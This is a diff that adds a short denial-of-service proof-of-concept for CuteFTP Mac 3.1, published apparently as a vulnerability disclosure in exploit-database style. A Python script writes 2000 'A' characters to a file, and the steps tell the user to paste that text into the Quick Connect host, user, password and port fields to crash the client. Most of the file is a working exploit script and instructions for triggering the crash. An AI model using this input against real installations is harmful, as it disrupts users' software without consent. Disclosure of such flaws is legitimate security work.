@@ -1,0 +1,23 @@
+# Exploit Title: CuteFTP Mac 3.1 Denial of Service (PoC)
+# Date: 2018-11-06
+# Exploit Author: Yair Rodríguez Aparicio
+# Vendor Homepage: https://www.globalscape.com/cuteftp
+# Software Link: http://go.globalscape.com/download/cuteftp-macosx
+# Version: 3.1
+# Tested on: macOS High Sierra 10.13
+
+# Steps to Produce the Crash:
+# 1.- Run python code : python cute.py
+# 2.- Open text.txt and copy content to clipboard
+# 3.- Open CuteFTP Mac
+# 4.- Clic on "Quick Connect"
+# 4.- Paste clipboard on "Host", "User", "Password" and "Port"
+# 5.- click on "Run"
+# 6.- Crashed!
+
+
+
+buffer = "\x41" * 2000
+f = open("text.txt", "w")
+f.write(buffer)
+f.close()
